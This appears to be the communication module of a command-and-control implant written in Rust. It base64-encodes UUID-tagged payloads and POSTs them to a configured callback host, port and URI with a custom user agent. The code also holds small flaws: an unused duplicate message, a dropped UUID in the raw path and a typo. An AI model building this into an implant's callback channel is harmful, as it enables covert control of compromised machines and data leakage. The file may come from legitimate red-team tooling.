use reqwest::blocking::Client;
use std::time::Duration;
use serde_json::Value;
use base64::{engine::general_purpose, Engine as _};
use crate::config;


pub fn send_request(payload: &str) -> Result<String, Box<dyn std::error::Error>> {
    send_request_internal(payload, true)
}

pub fn send_request_raw(payload: &str) -> Result<String, Box<dyn std::error::Error>> {
    send_request_internal(payload, false)
}

fn send_request_internal(payload: &str, encode: bool) -> Result<String, Box<dyn std::error::Error>> {
    println!("[SENDING] {}", payload);

    let uuid = config::UUID.read().unwrap();
    let full_msg = format!("{}{}", *uuid, payload);
    let encoded = if encode {
        let uuid = config::UUID.read().unwrap();
        let full_msg = format!("{}{}", *uuid, payload);
        general_purpose::STANDARD.encode(full_msg)
    } else {
        payload.to_string()
    };

    let url = format!(
        "{}://{}:{}/{}",
        if config::use_ssl { "https" } else { "http" },
        config::callback_host,
        config::callback_port,
        config::post_uri
    );

    let client = Client::new();
    let res = client
        .post(&url)
        .header("Content-Type", "application/json")
        .header("User-Agent", config::user_agent)
        .timeout(Duration::from_secs(10))
        .body(encoded)
        .send()?;

    let body = res.text()?;
    println!("[RECEeved] {}", body);
    // skip base64 decode
    Ok(body)
}

pub fn send_request_with_response(payload: &str) -> Result<Value, Box<dyn std::error::Error>> {
    let response_text = send_request(payload)?;
    let json: Value = serde_json::from_str(&response_text)?;
    Ok(json)
}

pub fn send_request_with_response_raw(payload: &str) -> Result<Value, Box<dyn std::error::Error>> {
    let response_text = send_request_raw(payload)?;
    let json: Value = serde_json::from_str(&response_text)?;
    Ok(json)
}
